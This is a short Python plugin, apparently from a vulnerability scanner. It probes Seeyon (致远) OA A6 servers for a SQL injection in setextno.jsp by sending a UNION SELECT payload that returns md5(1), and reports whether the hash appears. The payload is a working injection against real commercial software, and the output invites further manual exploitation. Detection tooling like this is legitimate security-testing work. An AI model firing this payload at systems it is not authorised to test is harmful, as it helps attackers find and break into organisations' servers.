import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 致远OA_A6_setextno_SQL注入Getshell(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url = urldata + "yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999)+union+all+select+1,2,(md5(1)),4#"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        response = requests.get(vuln_url, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in response.text:
            print(Vcolors.RED + "[!] 存在致远OA A6 setextno.jsp SQL注入Getshell漏洞, 可尝试手动进一步利用".format(vuln_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在致远OA A6 setextno.jsp SQL注入Getshell漏洞" + Vcolors.ENDC)
    except:
        logging.error("致远OA_A6_setextno_SQL注入Getshell脚本出现异常")



